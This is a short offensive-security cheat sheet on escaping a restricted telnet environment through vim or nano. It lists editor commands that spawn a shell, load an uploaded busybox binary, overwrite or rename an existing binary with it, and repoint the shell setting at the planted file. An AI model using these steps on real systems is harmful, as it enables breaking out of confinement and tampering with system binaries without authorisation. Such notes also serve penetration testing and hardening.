# Restricted Shell Escape via Text Editor (vim/nano)

A heavily restricted environment (no shell, only `telnet` into a single app) that happens to expose `vim` or `nano` often still has file read/write/rename primitives you can abuse to plant a working shell.

```vim
:shell          " try the obvious escape first
:Ex             " vim's built-in file explorer — browse the filesystem (h/j/k/l if arrows are blocked)
:e! /path/to/uploaded/static-busybox      " load a binary you uploaded (e.g. via anonymous FTP) as a buffer
:w! /path/to/writable/binary-name          " overwrite an existing (less-protected) binary file with it
```

If renaming matters more than overwriting (e.g. a BusyBox-style binary that picks its applet by filename), use the file explorer's rename (`R`) instead of `:w!` over the original. Then re-point whatever config references a shell path (`:set shell=...`) at your planted binary.
